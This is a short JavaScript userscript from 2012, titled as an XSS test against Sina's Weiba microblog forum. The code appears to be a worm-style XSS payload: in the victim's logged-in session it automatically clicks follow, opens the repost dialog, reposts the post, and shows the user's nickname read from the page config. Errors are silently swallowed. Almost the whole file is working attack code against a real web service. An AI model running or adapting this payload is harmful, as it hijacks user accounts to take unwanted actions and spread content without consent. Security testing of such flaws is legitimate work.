// ==UserScript==
// @name           新浪微吧xss test
// @version        2012-07-25 01:20:01
// @author         sd
// @description    新浪微吧xss test
// ==/UserScript==


// 通过class获取元素
function getElementsByClassName(n) {
	var classElements = [],
	allElements = document.getElementsByTagName('*');
	for (var i = 0; i < allElements.length; i++) {
		if (allElements[i].className == n) {
			classElements[classElements.length] = allElements[i]; //某类集合
		}
	}
	return classElements;
}

try{
//点击加关注
var litClassElements = getElementsByClassName('W_btn_b');
litClassElements[0].click();
}catch(e){}

try{
//弹出转发框
litClassElements = getElementsByClassName('forward');
litClassElements[0].getElementsByTagName("a")[0].click();
}catch(e){}

try{
//点击转发微贴
litClassElements = getElementsByClassName('op clearfix');
litClassElements[0].getElementsByTagName('div')[1].getElementsByTagName('a')[0].click();
}catch(e){}

try{
alert($CONFIG.nick);
}catch(e){}